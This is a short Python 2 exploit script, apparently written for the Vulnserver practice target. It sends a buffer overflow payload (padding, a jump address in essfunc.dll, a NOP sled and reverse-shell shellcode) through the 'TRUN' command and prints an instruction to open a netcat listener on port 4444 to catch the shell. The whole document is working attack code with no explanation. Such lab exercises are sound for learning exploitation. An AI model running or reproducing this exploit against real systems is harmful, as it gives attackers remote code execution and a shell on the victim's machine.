#!/usr/bin/env python2

"""
Generate a reverse shell by sending shellcode to the vulnerable server
"""

import socket
from options import HOST, PORT, SHELLCODE_OFFSET, ESSFUNC_DLL_JMP_LOCATIONS_LITTLE_ENDIAN, NOP, SHELLCODE

print("Run 'nc -nlvp 4444' to connect to the reverse shell :)")

buf = ('A' * SHELLCODE_OFFSET)
buf += ESSFUNC_DLL_JMP_LOCATIONS_LITTLE_ENDIAN[0]  # location of a DLL we can inject into
buf += (NOP * 16)  # add some NOPs
buf += SHELLCODE  # reverse shell server payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cmd = ('TRUN /.:/' + buf)

# print("SEND "+cmd)
s.send(cmd)
print("sent %d bytes" % len(cmd))
s.close()
